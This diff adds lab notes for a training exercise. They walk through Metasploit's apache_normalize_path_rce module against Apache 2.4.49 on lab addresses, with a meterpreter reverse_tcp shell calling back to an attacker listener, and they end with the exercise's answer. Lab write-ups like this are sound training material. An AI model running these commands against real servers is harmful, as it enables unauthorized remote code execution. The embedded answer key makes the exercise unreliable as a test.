@@ -1,0 +1,36 @@
+Questions
+Follow the steps from this section and launch the exploit module to get an interactive shell on VM #1. Enter pwd after the session is spawned and enter the current directory as answer.
+
+# Create a new workspace in MSFconsole
+msf6> workspace -a exploits
+msf6> search Apache 2.4.49
+...
+0  exploit/multi/http/apache_normalize_path_rce  2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
+3  auxiliary/scanner/http/apache_normalize_path  2021-05-10       normal     No     Apache 2.4.49/2.4.50 Traversal RCE scanner
+...
+
+msf6> use 0
+msf6 exploit(multi/http/apache_normalize_path_rce) > info # To review the exploit module description
+msf6 exploit(multi/http/apache_normalize_path_rce) > show options
+...
+Module options (exploit/multi/http/apache_normalize_path_rce):
+RHOSTS
+...
+Payload options (linux/x64/meterpreter/reverse_tcp):
+LHOST          yes       The listen address (an interface may be specified)
+LPORT  4444    yes       The listen port
+...
+
+# Prepare the exploit
+msf6 exploit(multi/http/apache_normalize_path_rce) > set payload linux/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/http/apache_normalize_path_rce) > set LHOST 192.168.45.166
+msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
+msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 80
+msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 192.168.217.16
+msf6 exploit(multi/http/apache_normalize_path_rce) > run
+...
+[!] This exploit may require manual cleanup of '/tmp/AoDOZBUe' on the target
+...
+
+meterpreter > pwd
+/usr/bin # there you get the answer
